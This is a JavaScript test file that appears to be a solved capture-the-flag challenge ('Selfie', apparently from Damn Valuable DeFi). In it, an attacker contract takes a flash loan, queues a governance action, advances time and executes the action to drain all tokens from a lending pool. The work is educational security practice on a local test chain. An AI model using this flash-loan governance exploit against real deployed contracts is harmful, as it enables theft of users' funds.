const { ethers, web3 } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Selfie', function () {
	let deployer, attacker;

	const TOKEN_INITIAL_SUPPLY = ethers.utils.parseEther('2000000'); // 2 million tokens
	const TOKENS_IN_POOL = ethers.utils.parseEther('1500000'); // 1.5 million tokens

	before(async function () {
		/** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
		[deployer, attacker] = await ethers.getSigners();

		const DamnValuableTokenSnapshotFactory = await ethers.getContractFactory(
			'DamnValuableTokenSnapshot',
			deployer,
		);
		const SimpleGovernanceFactory = await ethers.getContractFactory(
			'SimpleGovernance',
			deployer,
		);
		const SelfiePoolFactory = await ethers.getContractFactory(
			'SelfiePool',
			deployer,
		);

		this.token = await DamnValuableTokenSnapshotFactory.deploy(
			TOKEN_INITIAL_SUPPLY,
		);
		this.governance = await SimpleGovernanceFactory.deploy(this.token.address);
		this.pool = await SelfiePoolFactory.deploy(
			this.token.address,
			this.governance.address,
		);

		await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

		expect(await this.token.balanceOf(this.pool.address)).to.be.equal(
			TOKENS_IN_POOL,
		);
	});

	it('Exploit', async function () {
		/** CODE YOUR EXPLOIT HERE */
		const AttackSelfie = await ethers.getContractFactory(
			'AttackSelfie',
			attacker,
		);

		const attack = await AttackSelfie.deploy(
			this.pool.address,
			this.governance.address,
		);

		const tx = await attack.executeFlashLoan(TOKENS_IN_POOL);

		const res = await tx.wait();

		const actionQueuedSignature = web3.eth.abi.encodeEventSignature({
			name: 'ActionQueued',
			type: 'event',
			inputs: [
				{
					type: 'uint256',
					name: 'actionId',
				},
				{
					type: 'address',
					name: 'caller',
				},
			],
		});
		const actionQueuedEvent = res.logs.find(({ topics }) =>
			topics.includes(actionQueuedSignature),
		);

		await ethers.provider.send('evm_increaseTime', [2 * 24 * 60 * 60]); // 2 days

		await this.governance
			.connect(attacker)
			.executeAction(actionQueuedEvent.data);
	});

	after(async function () {
		/** SUCCESS CONDITIONS */

		// Attacker has taken all tokens from the pool
		expect(await this.token.balanceOf(attacker.address)).to.be.equal(
			TOKENS_IN_POOL,
		);
		expect(await this.token.balanceOf(this.pool.address)).to.be.equal('0');
	});
});
